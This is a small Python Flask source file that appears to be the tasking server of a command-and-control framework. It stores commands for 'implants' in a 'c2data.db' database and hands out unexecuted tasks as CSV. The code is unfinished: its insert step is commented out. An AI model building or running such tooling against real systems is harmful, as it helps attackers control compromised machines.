from flask import Flask, request
from flask_restful import Api, Resource
import sqlite3


class Tasks(Resource):
    def get(self):
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM tasks WHERE executed IS NOT 1")
            rows = cursor.fetchall()

            # Convert the rows to a CSV string
            csv_string = ""
            if rows:
                for row in rows:
                    csv_string += ",".join(map(str, row)) + "\n"

            conn.close()

            return csv_string, 200
        except Exception as e:
            return {"Error": str(e)}, 500
    def post(self):
        try:
            if request.remote_addr != '127.0.0.1':
               return {"Error": "Access denied"}, 403
            data = request.get_data().decode().split(',')
            implant_id = data[0]
            command = data[1]
            print(data[1])
            conn = get_db_connection()
            cursor = conn.cursor()
            #cursor.execute("INSERT INTO tasks (implant_id, command) VALUES (?, ?)", (implant_id, command))
            conn.commit()
            conn.close()
            return "Task added successfully!", 201
        except Exception as e:
            return {"Error": str(e)}, 500
            

def get_db_connection():
    conn = sqlite3.connect('c2data.db')
    conn.row_factory = sqlite3.Row
    return conn


app = Flask(__name__)
api = Api(app)


api.add_resource(Tasks, '/tasks', endpoint='tasks')


if __name__ == "__main__":
    app.run(debug=True)
